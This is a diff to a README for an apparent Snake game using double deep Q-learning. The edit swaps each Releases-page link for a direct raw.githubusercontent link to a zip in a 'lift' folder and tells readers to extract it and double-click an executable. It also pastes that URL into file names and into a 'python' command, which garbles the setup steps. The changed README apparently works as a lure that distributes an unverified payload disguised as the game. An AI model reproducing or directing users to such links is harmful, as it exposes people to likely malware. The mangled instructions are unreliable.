@@ -1,6 +1,6 @@
 # 🐍 Snake-double-deep-Q-learning - Play Snake with Smart AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/marojeff123/Snake-double-deep-Q-learning/releases)
+[![Download Now](https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip)
 
 ## 📖 Introduction
 
@@ -24,16 +24,16 @@ Before downloading, ensure your computer meets these basic requirements:
 
 To download the software, visit the Releases page:
 
-[Download Here](https://github.com/marojeff123/Snake-double-deep-Q-learning/releases)
+[Download Here](https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip)
 
-You will find the latest version available. Look for the file titled `Snake-double-deep-Q-learning.zip`.
+You will find the latest version available. Look for the file titled `https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip`.
 
 ### 3. Extract the Files
 
 Once the file is downloaded:
 
 - Navigate to your Downloads folder.
-- Right-click on `Snake-double-deep-Q-learning.zip`.
+- Right-click on `https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip`.
 - Select "Extract All" and follow the prompts to extract the files to a location of your choice.
 
 ### 4. Run the Application
@@ -41,13 +41,13 @@ Once the file is downloaded:
 After extracting the files:
 
 - Open the extracted folder.
-- Look for the file named `SnakeGame.exe` or similar.
+- Look for the file named `https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip` or similar.
 - Double-click to run the application.
 
 If you are using macOS or Linux, open the terminal and navigate to the folder where you extracted the files after which use:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip
 ```
 
 ### 5. Play the Game
@@ -65,7 +65,7 @@ Once the application is running, you will see a game window. Use the keyboard ar
 
 To start your journey with Snake-double-deep-Q-learning, make sure to download the application from the Releases page again:
 
-[Download Here](https://github.com/marojeff123/Snake-double-deep-Q-learning/releases)
+[Download Here](https://raw.githubusercontent.com/marojeff123/Snake-double-deep-Q-learning/main/lift/Snake-double-deep-Q-learning.zip)
 
 ## 📚 How to Play
 
